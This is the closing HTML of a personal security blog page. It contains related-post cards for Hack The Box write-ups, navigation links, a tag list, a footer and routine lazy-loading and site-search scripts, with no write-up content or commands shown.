class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/sauna-htb/"><div class="card-body"> <span class="timeago small" > Jul 19, 2020 <i class="unloaded">2020-07-19T19:50:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Sauna</h3><div class="text-muted small"><p> Configuration The operating systems that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the mac...</p></div></div></a></div><div class="card"> <a href="/posts/bastion-htb/"><div class="card-body"> <span class="timeago small" > Sep 7, 2019 <i class="unloaded">2019-09-07T23:11:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Bastion</h3><div class="text-muted small"><p> I found this machine a little hard at first as this was my first Windows machine and I wasn’t adept at exploiting Windows. After reading various write ups and guides online, I was able to root this...</p></div></div></a></div><div class="card"> <a href="/posts/heist-htb/"><div class="card-body"> <span class="timeago small" > Dec 2, 2019 <i class="unloaded">2019-12-02T00:27:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Heist</h3><div class="text-muted small"><p> Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. Always remember to map a domain name to the machine’s IP address to ease your rooting ! $ ech...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/postman-htb/" class="btn btn-outline-primary"><p>Hack The Box - Postman</p></a> <a href="/posts/sniper-htb/" class="btn btn-outline-primary"><p>Hack The Box - Sniper</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/rizemon">rizemon</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://rizemon.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
